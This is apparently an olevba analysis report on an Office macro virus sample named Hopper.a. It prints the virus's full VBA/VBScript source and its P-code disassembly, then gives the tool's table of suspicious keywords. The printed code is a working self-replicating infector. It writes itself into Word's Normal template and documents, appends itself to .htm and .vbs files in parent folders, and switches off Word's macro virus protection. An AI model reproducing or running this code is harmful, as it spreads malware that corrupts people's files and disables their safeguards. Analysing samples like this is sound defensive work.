olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSOffice.Hopper.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: ./Virus.MSOffice.Hopper.a - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foglio1.cls 
in file: ./Virus.MSOffice.Hopper.a - OLE stream: '_VBA_PROJECT_CUR/VBA/Foglio1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foglio2.cls 
in file: ./Virus.MSOffice.Hopper.a - OLE stream: '_VBA_PROJECT_CUR/VBA/Foglio2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foglio3.cls 
in file: ./Virus.MSOffice.Hopper.a - OLE stream: '_VBA_PROJECT_CUR/VBA/Foglio3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSOffice.Hopper.a - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'<html> <!--1nternal-->
'<head>
'<meta http-equiv="Content-Type"
'content="text/html; charset=iso-8859-1">
'<meta name="Author" content="1nternal">
'</head>
'<BODY>
'<script language="VBScript"><!--

Private FSO, NT, HostType, InfType, HostPath, Target, NextLine, TempFile

Private Sub WscriptCode()
        On Error Resume Next
        HostType = "VBS"
        HostPath = Wscript.ScriptFullName
        Call InfWord
        Call FindHTMVBS
End Sub

Private Sub FindHTMVBS()
        Set FSO = CreateObject("Scripting.FileSystemObject")
        cpath = FSO.GetParentFolderName(HostPath)
        Set folder = FSO.GetFolder(cpath)
        While folder.IsRootFolder = False
                Set folder = FSO.GetFolder(cpath)
                Set fc = folder.Files
                cpath = FSO.GetParentFolderName(cpath)
                For Each Target In fc
                        InfType = LCase(FSO.GetExtensionName(Target.Name))
                        If InfType = "html" Then InfType = "htm"
                        If InfType = "htm" Or InfType = "vbs" And Target.Path <> HostName Then
                                Set fh = FSO.opentextfile(Target.Path, 1, True)
                                TestString = fh.ReadLine
                                fh.Close
                                If TestString <> "<html> <!--1nternal-->" And TestString <> "'<html> <!--1nternal-->" Then
                                        Call DoFile
                                End If
                        End If
                Next
        Wend
End Sub

Private Sub InfWord()
        Set WordObj = CreateObject("Word.Application")
        Set NT = WordObj.Templates(1).VBProject.VBComponents(1).CodeModule
        If NT.Lines(1, 1) <> "'<html> <!--1nternal-->" Then
                WordObj.Options.SaveNormalPrompt = False
                NT.DeleteLines 1, NT.CountOfLines
                NT.AddFromFile HostPath
                NT.DeleteLines 181, (NT.CountOfLines - 180)
                If HostType = "HTM" Then
                        For j = 1 To 9
                                NT.ReplaceLine j, "'" + NT.Lines(j, 1)
                        Next
                        For j = 178 To 180
                                NT.ReplaceLine j, "'" + NT.Lines(j, 1)
                        Next
                Else
                        NT.ReplaceLine 12, Mid(NT.Lines(12, 1), 2)
                        NT.ReplaceLine 18, Mid(NT.Lines(18, 1), 2)
                End If
        End If
        Set NT = Nothing
        WordObj.Quit
End Sub

Private Sub Window_Onload()
        Randomize
        If Location.protocol = "file:" And (Int((6 * Rnd) + 1) = 1) Then Call Offline
End Sub

Private Sub Offline()
        Dim FSO, folder, fc, f1, cpath
        Set FSO = CreateObject("Scripting.FileSystemObject")
        HostPath = Replace(Location.href, "file:///", "")
        HostPath = Replace(HostPath, "/", "\")
        HostType = "HTM"
        Call InfWord
        Call FindHTMVBS
        Window.Status = "ActiveX.Comment /1nternal"
End Sub

Private Sub Document_Close()
        On Error Resume Next
        Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
        Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
        Options.VirusProtection = False
        Options.ConfirmConversions = False
        Options.SaveNormalPrompt = False
        If NT.Lines(1, 1) <> "'<html> <!--1nternal-->" Then
                For i = 1 To 180
                        NT.InsertLines i, AD.Lines(i, 1)
                Next
        End If
        If AD.Lines(1, 1) <> "'<html> <!--1nternal-->" Then
                For i = 1 To 180
                        AD.InsertLines i, NT.Lines(i, 1)
                Next
        End If
        HostType = "DOC"
        HostPath = "C:\Windows\Web\Afile.htm"
        If (Int((15 * Rnd) + 1) = 1) Then Call FindHTMVBS
Break:
End Sub

Private Sub CheckLine(LineNumber)
        If HostType = "DOC" Then
                If InfType = "htm" Then
                        If LineNumber < 9 Or LineNumber > 177 Then
                                NextLine = Mid(NextLine, 2)
                        End If
                Else
                        If LineNumber = 12 Or LineNumber = 18 Then
                                NextLine = "'" + NextLine
                        End If
                End If
        ElseIf HostType = "HTM" Then
                If InfType = "vbs" Then
                        If LineNumber < 9 Or LineNumber > 177 Then
                                NextLine = "'" + NextLine
                        End If
                        If LineNumber = 12 Or LineNumber = 18 Then
                                NextLine = "'" + NextLine
                        End If
                End If
        Else
                If InfType = "htm" Then
                        If LineNumber < 9 Or LineNumber > 177 Then
                                NextLine = Mid(NextLine, 2)
                        End If
                        If LineNumber = 12 Or LineNumber = 18 Then
                                NextLine = Mid(NextLine, 2)
                        End If
                End If
        End If
End Sub

Private Sub DoFileFromFile()
        Set fh = FSO.opentextfile(HostPath, 1, True)
        Set ft = FSO.opentextfile(Target.Path, 2, True)
        For j = 1 To 180
                NextLine = fh.ReadLine
                Call CheckLine(j)
                ft.WriteLine NextLine
        Next
        fh.Close
        ft.Close
End Sub

Private Sub DoFileFromDoc()
        Set ft = FSO.opentextfile(Target.Path, 2, True)
        For j = 1 To 180
                NextLine = NT.Lines(j, 1)
                Call CheckLine(j)
                ft.WriteLine NextLine
        Next
        ft.Close
End Sub

Private Sub DoFile()
        TempFile = FSO.GetTempName
        FSO.CopyFile Target.Path, TempFile
        If HostType = "DOC" Then
                Call DoFileFromDoc
        Else
                Call DoFileFromFile
        End If
        Set fh = FSO.opentextfile(TempFile, 1, True)
        Set ft = FSO.opentextfile(Target.Path, 8, True)
        Do While fh.AtEndOfStream <> True
                ft.WriteLine fh.ReadLine
        Loop
        ft.Close
        fh.Close
        FSO.DeleteFile TempFile
End Sub

'--></script>
'</BODY>
'</HTML>
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Foglio
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Foglio
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Foglio
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSOffice.Hopper.a
' ===============================================================================
' Module streams:
' _VBA_PROJECT_CUR/VBA/ThisWorkbook - 965 bytes
' _VBA_PROJECT_CUR/VBA/Foglio1 - 958 bytes
' _VBA_PROJECT_CUR/VBA/Foglio2 - 958 bytes
' _VBA_PROJECT_CUR/VBA/Foglio3 - 958 bytes
' _VBA_PROJECT_CUR/VBA/ThisDocument - 9795 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0016 "<html> <!--1nternal-->"
' Line #1:
' 	QuoteRem 0x0000 0x0006 "<head>"
' Line #2:
' 	QuoteRem 0x0000 0x001F "<meta http-equiv="Content-Type""
' Line #3:
' 	QuoteRem 0x0000 0x0028 "content="text/html; charset=iso-8859-1">"
' Line #4:
' 	QuoteRem 0x0000 0x0027 "<meta name="Author" content="1nternal">"
' Line #5:
' 	QuoteRem 0x0000 0x0007 "</head>"
' Line #6:
' 	QuoteRem 0x0000 0x0006 "<BODY>"
' Line #7:
' 	QuoteRem 0x0000 0x0020 "<script language="VBScript"><!--"
' Line #8:
' Line #9:
' 	Dim (Private) 
' 	VarDefn FSO
' 	VarDefn NT
' 	VarDefn HostType
' 	VarDefn InfType
' 	VarDefn HostPath
' 	VarDefn Target
' 	VarDefn NextLine
' 	VarDefn TempFile
' Line #10:
' Line #11:
' 	FuncDefn (Private Sub WscriptCode())
' Line #12:
' 	OnError (Resume Next) 
' Line #13:
' 	LitStr 0x0003 "VBS"
' 	St HostType 
' Line #14:
' 	Ld Wscript 
' 	MemLd ScriptFullName 
' 	St HostPath 
' Line #15:
' 	ArgsCall (Call) InfWord 0x0000 
' Line #16:
' 	ArgsCall (Call) FindHTMVBS 0x0000 
' Line #17:
' 	EndSub 
' Line #18:
' Line #19:
' 	FuncDefn (Private Sub FindHTMVBS())
' Line #20:
' 	SetStmt 
' 	LitStr 0x001A "Scripting.FileSystemObject"
' 	ArgsLd CreateObject 0x0001 
' 	Set FSO 
' Line #21:
' 	Ld HostPath 
' 	Ld FSO 
' 	ArgsMemLd GetParentFolderName 0x0001 
' 	St cpath 
' Line #22:
' 	SetStmt 
' 	Ld cpath 
' 	Ld FSO 
' 	ArgsMemLd GetFolder 0x0001 
' 	Set folder 
' Line #23:
' 	Ld folder 
' 	MemLd IsRootFolder 
' 	LitVarSpecial (False)
' 	Eq 
' 	While 
' Line #24:
' 	SetStmt 
' 	Ld cpath 
' 	Ld FSO 
' 	ArgsMemLd GetFolder 0x0001 
' 	Set folder 
' Line #25:
' 	SetStmt 
' 	Ld folder 
' 	MemLd Files 
' 	Set fc 
' Line #26:
' 	Ld cpath 
' 	Ld FSO 
' 	ArgsMemLd GetParentFolderName 0x0001 
' 	St cpath 
' Line #27:
' 	StartForVariable 
' 	Ld Target 
' 	EndForVariable 
' 	Ld fc 
' 	ForEach 
' Line #28:
' 	Ld Target 
' 	MemLd New 
' 	Ld FSO 
' 	ArgsMemLd GetExtensionName 0x0001 
' 	ArgsLd LCase 0x0001 
' 	St InfType 
' Line #29:
' 	Ld InfType 
' 	LitStr 0x0004 "html"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 "htm"
' 	St InfType 
' 	EndIf 
' Line #30:
' 	Ld InfType 
' 	LitStr 0x0003 "htm"
' 	Eq 
' 	Ld InfType 
' 	LitStr 0x0003 "vbs"
' 	Eq 
' 	Ld Target 
' 	MemLd Path 
' 	Ld HostName 
' 	Ne 
' 	And 
' 	Or 
' 	IfBlock 
' Line #31:
' 	SetStmt 
' 	Ld Target 
' 	MemLd Path 
' 	LitDI2 0x0001 
' 	LitVarSpecial (True)
' 	Ld FSO 
' 	ArgsMemLd opentextfile 0x0003 
' 	Set fh 
' Line #32:
' 	Ld fh 
' 	MemLd ReadLine 
' 	St TestString 
' Line #33:
' 	Ld fh 
' 	ArgsMemCall Close 0x0000 
' Line #34:
' 	Ld TestString 
' 	LitStr 0x0016 "<html> <!--1nternal-->"
' 	Ne 
' 	Ld TestString 
' 	LitStr 0x0017 "'<html> <!--1nternal-->"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #35:
' 	ArgsCall (Call) DoFile 0x0000 
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	StartForVariable 
' 	Next 
' Line #39:
' 	Wend 
' Line #40:
' 	EndSub 
' Line #41:
' Line #42:
' 	FuncDefn (Private Sub InfWord())
' Line #43:
' 	SetStmt 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set WordObj 
' Line #44:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld WordObj 
' 	ArgsMemLd Templates 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #45:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0017 "'<html> <!--1nternal-->"
' 	Ne 
' 	IfBlock 
' Line #46:
' 	LitVarSpecial (False)
' 	Ld WordObj 
' 	MemLd Options 
' 	MemSt SaveNormalPrompt 
' Line #47:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #48:
' 	Ld HostPath 
' 	Ld NT 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #49:
' 	LitDI2 0x00B5 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	LitDI2 0x00B4 
' 	Sub 
' 	Paren 
' 	Ld NT 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #50:
' 	Ld HostType 
' 	LitStr 0x0003 "HTM"
' 	Eq 
' 	IfBlock 
' Line #51:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0009 
' 	For 
' Line #52:
' 	Ld j 
' 	LitStr 0x0001 "'"
' 	Ld j 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	Add 
' 	Ld NT 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #53:
' 	StartForVariable 
' 	Next 
' Line #54:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x00B2 
' 	LitDI2 0x00B4 
' 	For 
' Line #55:
' 	Ld j 
' 	LitStr 0x0001 "'"
' 	Ld j 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	Add 
' 	Ld NT 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #56:
' 	StartForVariable 
' 	Next 
' Line #57:
' 	ElseBlock 
' Line #58:
' 	LitDI2 0x000C 
' 	LitDI2 0x000C 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0002 
' 	Ld NT 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #59:
' 	LitDI2 0x0012 
' 	LitDI2 0x0012 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0002 
' 	Ld NT 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	EndIfBlock 
' Line #62:
' 	SetStmt 
' 	LitNothing 
' 	Set NT 
' Line #63:
' 	Ld WordObj 
' 	ArgsMemCall Quit 0x0000 
' Line #64:
' 	EndSub 
' Line #65:
' Line #66:
' 	FuncDefn (Private Sub Window_Onload())
' Line #67:
' 	ArgsCall Read 0x0000 
' Line #68:
' 	Ld Location 
' 	MemLd protocol 
' 	LitStr 0x0005 "file:"
' 	Eq 
' 	LitDI2 0x0006 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Offline 0x0000 
' 	EndIf 
' Line #69:
' 	EndSub 
' Line #70:
' Line #71:
' 	FuncDefn (Private Sub Offline())
' Line #72:
' 	Dim 
' 	VarDefn FSO
' 	VarDefn folder
' 	VarDefn fc
' 	VarDefn f1
' 	VarDefn cpath
' Line #73:
' 	SetStmt 
' 	LitStr 0x001A "Scripting.FileSystemObject"
' 	ArgsLd CreateObject 0x0001 
' 	Set FSO 
' Line #74:
' 	Ld Location 
' 	MemLd href 
' 	LitStr 0x0008 "file:///"
' 	LitStr 0x0000 ""
' 	ArgsLd Replace 0x0003 
' 	St HostPath 
' Line #75:
' 	Ld HostPath 
' 	LitStr 0x0001 "/"
' 	LitStr 0x0001 "\"
' 	ArgsLd Replace 0x0003 
' 	St HostPath 
' Line #76:
' 	LitStr 0x0003 "HTM"
' 	St HostType 
' Line #77:
' 	ArgsCall (Call) InfWord 0x0000 
' Line #78:
' 	ArgsCall (Call) FindHTMVBS 0x0000 
' Line #79:
' 	LitStr 0x0019 "ActiveX.Comment /1nternal"
' 	Ld Window 
' 	MemSt Status 
' Line #80:
' 	EndSub 
' Line #81:
' Line #82:
' 	FuncDefn (Private Sub Document_Close())
' Line #83:
' 	OnError (Resume Next) 
' Line #84:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #85:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set AD 
' Line #86:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #87:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #88:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #89:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0017 "'<html> <!--1nternal-->"
' 	Ne 
' 	IfBlock 
' Line #90:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x00B4 
' 	For 
' Line #91:
' 	Ld i 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd Lines 0x0002 
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #92:
' 	StartForVariable 
' 	Next 
' Line #93:
' 	EndIfBlock 
' Line #94:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0017 "'<html> <!--1nternal-->"
' 	Ne 
' 	IfBlock 
' Line #95:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x00B4 
' 	For 
' Line #96:
' 	Ld i 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	Ld AD 
' 	ArgsMemCall InsertLines 0x0002 
' Line #97:
' 	StartForVariable 
' 	Next 
' Line #98:
' 	EndIfBlock 
' Line #99:
' 	LitStr 0x0003 "DOC"
' 	St HostType 
' Line #100:
' 	LitStr 0x0018 "C:\Windows\Web\Afile.htm"
' 	St HostPath 
' Line #101:
' 	LitDI2 0x000F 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) FindHTMVBS 0x0000 
' 	EndIf 
' Line #102:
' 	Label Break 
' Line #103:
' 	EndSub 
' Line #104:
' Line #105:
' 	FuncDefn (Private Sub CheckLine(LineNumber))
' Line #106:
' 	Ld HostType 
' 	LitStr 0x0003 "DOC"
' 	Eq 
' 	IfBlock 
' Line #107:
' 	Ld InfType 
' 	LitStr 0x0003 "htm"
' 	Eq 
' 	IfBlock 
' Line #108:
' 	Ld LineNumber 
' 	LitDI2 0x0009 
' 	Lt 
' 	Ld LineNumber 
' 	LitDI2 0x00B1 
' 	Gt 
' 	Or 
' 	IfBlock 
' Line #109:
' 	Ld NextLine 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0002 
' 	St NextLine 
' Line #110:
' 	EndIfBlock 
' Line #111:
' 	ElseBlock 
' Line #112:
' 	Ld LineNumber 
' 	LitDI2 0x000C 
' 	Eq 
' 	Ld LineNumber 
' 	LitDI2 0x0012 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #113:
' 	LitStr 0x0001 "'"
' 	Ld NextLine 
' 	Add 
' 	St NextLine 
' Line #114:
' 	EndIfBlock 
' Line #115:
' 	EndIfBlock 
' Line #116:
' 	Ld HostType 
' 	LitStr 0x0003 "HTM"
' 	Eq 
' 	ElseIfBlock 
' Line #117:
' 	Ld InfType 
' 	LitStr 0x0003 "vbs"
' 	Eq 
' 	IfBlock 
' Line #118:
' 	Ld LineNumber 
' 	LitDI2 0x0009 
' 	Lt 
' 	Ld LineNumber 
' 	LitDI2 0x00B1 
' 	Gt 
' 	Or 
' 	IfBlock 
' Line #119:
' 	LitStr 0x0001 "'"
' 	Ld NextLine 
' 	Add 
' 	St NextLine 
' Line #120:
' 	EndIfBlock 
' Line #121:
' 	Ld LineNumber 
' 	LitDI2 0x000C 
' 	Eq 
' 	Ld LineNumber 
' 	LitDI2 0x0012 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #122:
' 	LitStr 0x0001 "'"
' 	Ld NextLine 
' 	Add 
' 	St NextLine 
' Line #123:
' 	EndIfBlock 
' Line #124:
' 	EndIfBlock 
' Line #125:
' 	ElseBlock 
' Line #126:
' 	Ld InfType 
' 	LitStr 0x0003 "htm"
' 	Eq 
' 	IfBlock 
' Line #127:
' 	Ld LineNumber 
' 	LitDI2 0x0009 
' 	Lt 
' 	Ld LineNumber 
' 	LitDI2 0x00B1 
' 	Gt 
' 	Or 
' 	IfBlock 
' Line #128:
' 	Ld NextLine 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0002 
' 	St NextLine 
' Line #129:
' 	EndIfBlock 
' Line #130:
' 	Ld LineNumber 
' 	LitDI2 0x000C 
' 	Eq 
' 	Ld LineNumber 
' 	LitDI2 0x0012 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #131:
' 	Ld NextLine 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0002 
' 	St NextLine 
' Line #132:
' 	EndIfBlock 
' Line #133:
' 	EndIfBlock 
' Line #134:
' 	EndIfBlock 
' Line #135:
' 	EndSub 
' Line #136:
' Line #137:
' 	FuncDefn (Private Sub DoFileFromFile())
' Line #138:
' 	SetStmt 
' 	Ld HostPath 
' 	LitDI2 0x0001 
' 	LitVarSpecial (True)
' 	Ld FSO 
' 	ArgsMemLd opentextfile 0x0003 
' 	Set fh 
' Line #139:
' 	SetStmt 
' 	Ld Target 
' 	MemLd Path 
' 	LitDI2 0x0002 
' 	LitVarSpecial (True)
' 	Ld FSO 
' 	ArgsMemLd opentextfile 0x0003 
' 	Set ft 
' Line #140:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x00B4 
' 	For 
' Line #141:
' 	Ld fh 
' 	MemLd ReadLine 
' 	St NextLine 
' Line #142:
' 	Ld j 
' 	ArgsCall (Call) CheckLine 0x0001 
' Line #143:
' 	Ld NextLine 
' 	Ld ft 
' 	ArgsMemCall WriteLine 0x0001 
' Line #144:
' 	StartForVariable 
' 	Next 
' Line #145:
' 	Ld fh 
' 	ArgsMemCall Close 0x0000 
' Line #146:
' 	Ld ft 
' 	ArgsMemCall Close 0x0000 
' Line #147:
' 	EndSub 
' Line #148:
' Line #149:
' 	FuncDefn (Private Sub DoFileFromDoc())
' Line #150:
' 	SetStmt 
' 	Ld Target 
' 	MemLd Path 
' 	LitDI2 0x0002 
' 	LitVarSpecial (True)
' 	Ld FSO 
' 	ArgsMemLd opentextfile 0x0003 
' 	Set ft 
' Line #151:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x00B4 
' 	For 
' Line #152:
' 	Ld j 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	St NextLine 
' Line #153:
' 	Ld j 
' 	ArgsCall (Call) CheckLine 0x0001 
' Line #154:
' 	Ld NextLine 
' 	Ld ft 
' 	ArgsMemCall WriteLine 0x0001 
' Line #155:
' 	StartForVariable 
' 	Next 
' Line #156:
' 	Ld ft 
' 	ArgsMemCall Close 0x0000 
' Line #157:
' 	EndSub 
' Line #158:
' Line #159:
' 	FuncDefn (Private Sub DoFile())
' Line #160:
' 	Ld FSO 
' 	MemLd GetTempName 
' 	St TempFile 
' Line #161:
' 	Ld Target 
' 	MemLd Path 
' 	Ld TempFile 
' 	Ld FSO 
' 	ArgsMemCall CopyFile 0x0002 
' Line #162:
' 	Ld HostType 
' 	LitStr 0x0003 "DOC"
' 	Eq 
' 	IfBlock 
' Line #163:
' 	ArgsCall (Call) DoFileFromDoc 0x0000 
' Line #164:
' 	ElseBlock 
' Line #165:
' 	ArgsCall (Call) DoFileFromFile 0x0000 
' Line #166:
' 	EndIfBlock 
' Line #167:
' 	SetStmt 
' 	Ld TempFile 
' 	LitDI2 0x0001 
' 	LitVarSpecial (True)
' 	Ld FSO 
' 	ArgsMemLd opentextfile 0x0003 
' 	Set fh 
' Line #168:
' 	SetStmt 
' 	Ld Target 
' 	MemLd Path 
' 	LitDI2 0x0008 
' 	LitVarSpecial (True)
' 	Ld FSO 
' 	ArgsMemLd opentextfile 0x0003 
' 	Set ft 
' Line #169:
' 	Ld fh 
' 	MemLd AtEndOfStream 
' 	LitVarSpecial (True)
' 	Ne 
' 	DoWhile 
' Line #170:
' 	Ld fh 
' 	MemLd ReadLine 
' 	Ld ft 
' 	ArgsMemCall WriteLine 0x0001 
' Line #171:
' 	Loop 
' Line #172:
' 	Ld ft 
' 	ArgsMemCall Close 0x0000 
' Line #173:
' 	Ld fh 
' 	ArgsMemCall Close 0x0000 
' Line #174:
' 	Ld TempFile 
' 	Ld FSO 
' 	ArgsMemCall DeleteFile 0x0001 
' Line #175:
' 	EndSub 
' Line #176:
' Line #177:
' 	QuoteRem 0x0000 0x000C "--></script>"
' Line #178:
' 	QuoteRem 0x0000 0x0007 "</BODY>"
' Line #179:
' 	QuoteRem 0x0000 0x0007 "</HTML>"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

